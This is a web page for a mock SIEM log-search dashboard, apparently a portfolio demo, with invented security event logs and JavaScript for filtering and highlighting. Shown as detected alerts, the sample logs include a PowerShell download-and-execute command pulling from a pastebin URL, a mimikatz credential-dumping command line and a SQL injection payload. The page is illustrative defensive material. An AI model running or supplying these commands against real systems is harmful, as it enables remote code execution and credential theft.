---
layout: default
title: Log Analysis
permalink: /logs/
---

<style>
    /* Full Screen Modu */
    main { max-width: 98% !important; margin: 0 auto !important; padding: 1rem !important; }
    header, .navbar { max-width: 100% !important; }
</style>

<div class="siem-container">

    <div class="search-section">
        <div class="search-input-wrapper">
            <span class="search-prompt">root@siem:~$ index=main sourcetype="win_event_log" | search</span>
            <input type="text" id="searchInput" placeholder="Enter keywords (e.g., Fail, Error, 4625, Mimikatz)..." onkeyup="filterLogs()">
            <button class="btn-search" onclick="filterLogs()">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
            </button>
        </div>
        <div class="time-picker">
            <span>Last 24 Hours</span>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
        </div>
    </div>

    <div class="timeline-wrapper">
        <div class="timeline-bars" id="timeline">
            </div>
    </div>

    <div class="siem-body">
        
        <div class="siem-sidebar">
            <h3>INTERESTING FIELDS</h3>
            <div class="field-group">
                <div class="field-name">source_ip <span class="count">8</span></div>
                <div class="field-name">dest_port <span class="count">4</span></div>
                <div class="field-name">event_code <span class="count">12</span></div>
                <div class="field-name">user_account <span class="count">5</span></div>
                <div class="field-name">host <span class="count">6</span></div>
                <div class="field-name">severity <span class="count">3</span></div>
            </div>
            
            <div class="ad-box">
                <strong>SYSTEM STATUS</strong><br>
                Indexing Rate: 4500 EPS<br>
                Storage: 82% Full
            </div>
        </div>

        <div class="siem-results">
            <div class="results-header">
                <span id="resultCount">0 events matched</span>
                <div class="pagination">
                    <button disabled>&lt; Prev</button>
                    <button class="active">1</button>
                    <button>2</button>
                    <button>3</button>
                    <button>Next &gt;</button>
                </div>
            </div>

            <table class="logs-table">
                <thead>
                    <tr>
                        <th width="140">Time</th>
                        <th width="100">Level</th>
                        <th width="150">Host</th>
                        <th>Raw Event Log</th>
                    </tr>
                </thead>
                <tbody id="logsTableBody">
                    </tbody>
            </table>
        </div>
    </div>
</div>

<script>
    // --- MOCK LOG DATA (Alerts Sayfasıyla Uyumlu) ---
    const rawLogs = [
        { time: "2025-12-19 10:42:15", level: "CRITICAL", host: "FINANCE-SRV-01", msg: "EventCode=4663 Action=WriteData ProcessName=tasksche.exe FilePath=D:\\Finance\\Budget.xlsx.wnry Message='Ransomware activity detected. High entropy write operation.'" },
        { time: "2025-12-19 10:42:14", level: "INFO", host: "FINANCE-SRV-01", msg: "EventCode=4624 LogonType=3 AccountName=SYSTEM AuthenticationPackage=Kerberos Source_IP=192.168.1.105" },
        { time: "2025-12-19 10:41:05", level: "CRITICAL", host: "HR-MANAGER-PC", msg: "Sysmon EventID=3 Image=C:\\Windows\\System32\\rundll32.exe DestinationIP=45.133.1.22 Protocol=HTTPS UserAgent='Mozilla/5.0' Message='Cobalt Strike Beacon activity detected via network signature.'" },
        { time: "2025-12-19 10:38:22", level: "HIGH", host: "CEO-LAPTOP", msg: "EventCode=4688 NewProcessName=mimikatz.exe CreatorProcess=powershell.exe CommandLine='sekurlsa::logonpasswords' Alert='Credential Dumping Tool Execution'" },
        { time: "2025-12-19 10:35:10", level: "HIGH", host: "DEV-WORKSTATION-04", msg: "PowerShell EventID=4104 ScriptBlockText='IEX(New-Object Net.WebClient).DownloadString(\"http://pastebin.com/raw/malicious\")' User=corp\\dev_admin" },
        { time: "2025-12-19 10:30:00", level: "WARN", host: "VPN-GATEWAY", msg: "GeoLocation_Alert User=jdoe Source_IP=203.0.113.5 (China) Previous_Login_IP=198.51.100.2 (USA) Velocity='9000 km/h' Message='Impossible Travel Detected'" },
        { time: "2025-12-19 10:28:45", level: "ERROR", host: "WEB-SRV-PROD", msg: "WAF_Log Action=BLOCK Rule='SQL Injection Detected' Payload='UNION SELECT 1,2,3--' Source_IP=185.200.1.1 URL='/login.php'" },
        { time: "2025-12-19 10:25:12", level: "WARN", host: "FILE-SRV-02", msg: "DLP_Alert Policy='Confidential Data' Action=Monitor Bytes_Sent=5368709120 Destination=mega.nz Process=chrome.exe" },
        { time: "2025-12-19 10:20:05", level: "INFO", host: "MARKETING-PC-01", msg: "EventCode=4720 AccountName=Support_Backdoor Creator=CORP\\jsoh Group=Administrators Message='New user account created.'" },
        { time: "2025-12-19 10:15:33", level: "WARN", host: "IDS-SENSOR-01", msg: "Suricata_Alert SID=2001219 Msg='ET SCAN Potential Internal Network Scan' Source_IP=192.168.1.50 Dest_IP=192.168.1.* Protocol=TCP" },
        { time: "2025-12-19 09:55:10", level: "ERROR", host: "LINUX-JUMP-HOST", msg: "sshd[1299]: Failed password for invalid user admin from 192.168.1.5 port 4422 ssh2" },
        { time: "2025-12-19 09:55:08", level: "ERROR", host: "LINUX-JUMP-HOST", msg: "sshd[1299]: Failed password for invalid user root from 192.168.1.5 port 4422 ssh2" },
        { time: "2025-12-19 09:40:22", level: "INFO", host: "AD-CONTROLLER", msg: "EventCode=4776 PackageName=MICROSOFT_AUTHENTICATION_PACKAGE_V1_0 LogonAccount=msmith SourceWorkstation=WORKSTATION-01 ErrorCode=0xC0000064 (User Does Not Exist)" },
        { time: "2025-12-19 09:30:15", level: "INFO", host: "FW-PERIMETER", msg: "Action=DENY Interface=WAN Source_IP=10.10.10.5 Dest_IP=8.8.8.8 Protocol=UDP Port=53 Message='DNS Query blocked by policy'" },
        { time: "2025-12-19 09:15:00", level: "INFO", host: "EXCHANGE-SRV", msg: "MSExchange Process=w3wp.exe Event=Receive Connector=Default Source_IP=10.0.0.5 Message='Mail received successfully'" }
    ];

    // IP Maskeleme Fonksiyonu (192.168.1.55 -> 192.168.1.***)
    function maskIPs(text) {
        // Regex: Basit IPv4 yakalama
        return text.replace(/(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}/g, "$1.***");
    }

    // Renklendirme Fonksiyonu
    function highlightKeywords(text) {
        text = text.replace(/(CRITICAL|ERROR|Fail|Block|Deny|Malicious|Ransomware|Mimikatz)/gi, '<span class="hl-red">$1</span>');
        text = text.replace(/(WARN|High|Suspicious)/gi, '<span class="hl-orange">$1</span>');
        text = text.replace(/(INFO|Success|Accept)/gi, '<span class="hl-green">$1</span>');
        return maskIPs(text);
    }

    function renderLogs(logs) {
        const tbody = document.getElementById("logsTableBody");
        const countSpan = document.getElementById("resultCount");
        tbody.innerHTML = "";
        
        logs.forEach(log => {
            let row = `<tr>
                <td class="mono time">${log.time}</td>
                <td class="mono"><span class="badge ${log.level.toLowerCase()}">${log.level}</span></td>
                <td class="mono host">${log.host}</td>
                <td class="mono raw">${highlightKeywords(log.msg)}</td>
            </tr>`;
            tbody.innerHTML += row;
        });
        
        countSpan.innerText = logs.length + " events matched";
    }

    // Arama Fonksiyonu
    function filterLogs() {
        let input = document.getElementById("searchInput").value.toLowerCase();
        let filtered = rawLogs.filter(log => {
            return log.msg.toLowerCase().includes(input) || 
                   log.host.toLowerCase().includes(input) || 
                   log.level.toLowerCase().includes(input);
        });
        renderLogs(filtered);
    }

    // Timeline Oluşturma (Rastgele çubuklar)
    function initTimeline() {
        const timeline = document.getElementById("timeline");
        for(let i=0; i<60; i++) {
            let h = Math.floor(Math.random() * 40) + 5; // 5-45px arası yükseklik
            let color = Math.random() > 0.9 ? '#ff5f56' : '#3fb950'; // Arada kırmızı hatalar olsun
            let bar = `<div style="height:${h}px; background:${color}; width: 100%; opacity:0.7;"></div>`;
            timeline.innerHTML += bar;
        }
    }

    // Sayfa Yüklendiğinde
    window.onload = function() {
        renderLogs(rawLogs);
        initTimeline();
    };
</script>

<style>
    /* ===== SIEM STYLES ===== */
    .siem-container { display: flex; flex-direction: column; gap: 10px; font-family: 'Inter', sans-serif; height: 85vh; }

    /* Search Bar */
    .search-section { display: flex; gap: 10px; align-items: center; margin-bottom: 5px; }
    .search-input-wrapper { flex: 1; display: flex; background: #fff; border-radius: 4px; overflow: hidden; align-items: center; position: relative; }
    .search-prompt { position: absolute; left: 10px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: #58a6ff; font-weight: bold; pointer-events: none; display: none; /* Mobilde gizle, PC'de açılabilir */ }
    
    @media(min-width: 900px) {
        .search-prompt { display: block; }
        #searchInput { padding-left: 280px !important; } 
    }

    #searchInput { 
        width: 100%; border: none; padding: 12px 15px; font-family: 'JetBrains Mono', monospace; 
        font-size: 0.9rem; color: #24292f; background: #fff; outline: none; 
    }
    .btn-search { background: #3fb950; border: none; padding: 0 15px; cursor: pointer; color: #fff; }
    .btn-search:hover { background: #2ea043; }

    .time-picker { 
        background: #161b22; border: 1px solid #30363d; color: #c9d1d9; padding: 10px 15px; 
        border-radius: 4px; font-size: 0.85rem; display: flex; align-items: center; gap: 8px; cursor: pointer; 
    }

    /* Timeline */
    .timeline-wrapper { background: #0d1117; height: 50px; border: 1px solid #30363d; margin-bottom: 10px; border-radius: 4px; padding: 0 10px; display: flex; align-items: flex-end; }
    .timeline-bars { display: flex; gap: 2px; width: 100%; align-items: flex-end; padding-bottom: 2px; }

    /* Body Layout */
    .siem-body { display: flex; gap: 15px; flex: 1; overflow: hidden; }
    
    /* Sidebar */
    .siem-sidebar { width: 220px; background: #161b22; border: 1px solid #30363d; border-radius: 4px; padding: 15px; display: flex; flex-direction: column; gap: 20px; overflow-y: auto; }
    .siem-sidebar h3 { margin: 0 0 10px 0; font-size: 0.75rem; color: #8b949e; border-bottom: 1px solid #30363d; padding-bottom: 5px; }
    .field-name { font-size: 0.8rem; color: #58a6ff; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 6px; }
    .field-name:hover { text-decoration: underline; }
    .count { color: #8b949e; font-size: 0.75rem; }
    
    .ad-box { background: rgba(63, 185, 80, 0.1); border: 1px solid #3fb950; padding: 10px; font-size: 0.75rem; color: #3fb950; border-radius: 4px; font-family: 'JetBrains Mono', monospace; }

    /* Results */
    .siem-results { flex: 1; display: flex; flex-direction: column; background: #0d1117; border: 1px solid #30363d; border-radius: 4px; overflow: hidden; }
    .results-header { background: #161b22; padding: 8px 15px; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }
    #resultCount { font-size: 0.8rem; color: #8b949e; font-weight: bold; }
    
    .pagination button { background: transparent; border: 1px solid #30363d; color: #c9d1d9; padding: 2px 8px; border-radius: 3px; cursor: pointer; font-size: 0.75rem; }
    .pagination button.active { background: #58a6ff; color: #0d1117; border-color: #58a6ff; }
    .pagination button:hover:not(:disabled) { border-color: #8b949e; }

    .logs-table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
    .logs-table th { background: #161b22; color: #8b949e; text-align: left; padding: 8px 10px; font-weight: normal; border-bottom: 1px solid #30363d; }
    .logs-table td { padding: 6px 10px; border-bottom: 1px solid #21262d; vertical-align: top; color: #c9d1d9; }
    .logs-table tr:hover { background: rgba(255,255,255,0.03); }

    .mono { font-family: 'JetBrains Mono', monospace; }
    .time { color: #8b949e; white-space: nowrap; }
    .host { color: #d29922; }
    .raw { word-break: break-all; line-height: 1.5; }

    /* Highlights */
    .hl-red { color: #ff5f56; font-weight: bold; }
    .hl-orange { color: #d29922; font-weight: bold; }
    .hl-green { color: #3fb950; font-weight: bold; }
    
    /* Badges */
    .badge { padding: 2px 6px; border-radius: 3px; font-size: 0.65rem; font-weight: bold; }
    .critical { background: #ff5f56; color: #0d1117; }
    .error { background: #ff5f56; color: #0d1117; }
    .high, .warn { background: #d29922; color: #0d1117; }
    .info { background: #58a6ff; color: #0d1117; }

    /* Mobile */
    @media(max-width: 768px) {
        .siem-body { flex-direction: column; }
        .siem-sidebar { width: 100%; height: auto; padding: 10px; display: none; /* Mobilde sidebar'ı gizle yer kalsın */ }
        .timeline-wrapper { display: none; }
        .search-input-wrapper { flex-direction: column; }
    }
</style>
